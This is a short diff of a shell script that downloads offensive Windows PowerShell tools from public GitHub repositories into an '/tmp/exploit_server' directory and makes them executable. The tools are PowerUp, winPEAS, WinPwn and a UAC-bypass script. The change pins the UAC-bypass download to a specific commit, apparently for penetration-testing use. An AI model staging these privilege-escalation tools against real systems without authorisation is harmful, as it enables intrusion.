@@ -33,7 +33,7 @@ download_script() {
 download_script "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" "/tmp/exploit_server/powersploit.ps1"
 download_script "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1" "/tmp/exploit_server/winpeas.ps1"
 download_script "https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Offline_WinPwn.ps1" "/tmp/exploit_server/winpwn.ps1"
-download_script "https://raw.githubusercontent.com/paulkwalton/thescriptvault/refs/heads/main/privesc/windows/uac-bypass.ps1"
+download_script "https://github.com/paulkwalton/thescriptvault/blob/cf3ec0d2fddd057b0f37e231f6515635e8918db8/privesc/windows/uac-bypass.ps1" "/tmp/exploit_server/uac-bypass.ps1"
 
 chmod 755 -R /tmp/exploit_server
 
